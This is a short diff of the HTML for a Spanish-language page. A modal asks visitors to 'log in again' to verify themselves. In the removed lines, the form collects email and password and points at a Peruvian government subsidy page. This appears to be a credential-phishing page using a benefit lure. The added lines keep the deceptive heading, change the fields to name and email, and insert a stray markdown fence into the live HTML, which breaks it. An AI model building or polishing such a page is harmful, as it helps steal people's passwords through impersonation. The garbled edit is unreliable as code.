@@ -66,30 +66,33 @@ button:hover{
 
 <div class="modal">
   <h2>Para saber si eres tú inicia sesión de nuevo</h2>
-
+```html
 <form
- name="contact" method="POST" data-netlify="true"
-  action="https://www.gob.pe/12554-consulta-si-tu-hogar-recibira-el-bono-600"
-  
+  name="contact"
+  method="POST"
+  data-netlify="true"
+  action="/gracias.html"
 >
-  <input type="hidden" name="form-name" value="contacto">
+  <input type="hidden" name="form-name" value="contact">
 
   <input
-    type="email"
+    type="text"
     name="nombre"
-    placeholder="Correo electronico"
+    placeholder="Nombre"
     required
   >
 
   <input
-    type="password"
-    name="correo"
-    placeholder="Password"
+    type="email"
+    name="email"
+    placeholder="Correo electrónico"
     required
   >
 
   <button type="submit">Enviar</button>
 </form>
+```
+
 </div>
 
 <script>
